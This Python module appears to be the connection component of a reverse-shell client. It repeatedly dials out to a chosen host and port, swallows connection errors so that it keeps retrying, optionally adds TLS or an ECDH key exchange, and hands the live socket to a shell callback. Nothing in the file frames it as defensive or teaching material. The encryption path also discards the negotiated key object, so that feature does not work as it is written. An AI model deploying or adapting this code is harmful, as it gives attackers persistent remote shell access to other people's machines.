import socket
import time


def connect_and_run(host, port, shell_callback, reconnect_interval=5, encryption=False, tls=False):
    first_attempt = True
    while True:
        sock = None
        try:
            if not first_attempt:
                time.sleep(reconnect_interval)
            first_attempt = False

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((host, port))
            sock.settimeout(None)

            if tls:
                from client.core.tls import wrap_client_socket
                sock = wrap_client_socket(sock, hostname=host)

            if encryption:
                _client_key_exchange(sock)

            shell_callback(sock, encryption, tls)
            if sock:
                sock.close()
            break
        except (socket.timeout, ConnectionRefusedError, OSError):
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
        except Exception:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
            raise


def _client_key_exchange(sock):
    from client.utils.crypto import ECDHEncryption
    crypto = ECDHEncryption()
    client_pub = crypto.public_key_bytes
    sock.sendall(client_pub)
    server_pub = sock.recv(1024)
    if not server_pub:
        raise ConnectionError("Connection closed during key exchange")
    crypto.compute_shared_key(server_pub)
    return crypto
